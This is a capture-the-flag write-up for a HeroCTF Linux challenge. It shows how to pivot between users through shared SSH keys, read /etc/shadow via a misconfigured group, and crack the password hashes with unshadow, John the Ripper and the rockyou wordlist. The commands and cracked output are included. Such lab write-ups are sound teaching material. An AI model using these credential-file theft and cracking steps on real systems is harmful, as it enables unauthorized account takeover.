# The Dark Knight

### Category

System

### Description

The Batman is lurking in the shadows, ready to take down the next criminal.
Usually we don't mind, but he has some critical intel he won't share about the
Joker : his password on the network. Gordon, find who he is and get the intel. We know it's one of the users of this network.

Good luck.

```shell
$ ssh gordon@chall0.heroctf.fr -p 5005
password : gotham
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

When you connect to the machine, and do some recon, you'll notice 4 other users in addition to the Joker and Gordon.
They all have the initials BW (in reference to Bruce Wayne). They also all have Gordon in their `~/.ssh/authorized_keys` file.
It means you can connect without a password through SSH from the Gordon user.
```
$ ssh user@localhost
```
There is not much to see for each user, until you notice that the **bradley_warner** user is the **shadow** group.
This misconfiguration allows us to read the `/etc/shadow` file in which the different session password hashes are stored.

Once you recovered the shadow file, make sure to get the content of `/etc/passwd` as well (it's world readable).

Finally we can use *John the Reaper* to crack the hashes. It comes with a secondary tool, that allows us to combine
the *shadow* and *passwd* files to make it into a readble format for *John*.

```
$ unshadow passwd shadow > hashes
```

The `hashes` file now contains our properly formatted hashes. Let's crack it using *Rockyou*.

```
$ john hashes -wordlist=/usr/share/wordlists/rockyou.txt
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Remaining 2 password hash
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (gordon)
ilovebatman      (joker)
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

It may take anything from a seconds to a few minutes, depending on the hardware your using to crack the passwords.
But eventually here you go, **password123** for *gordon* (which we already knew), and **ilovebatman** for *joker* !

### Flag

```Hero{ilovebatman}```
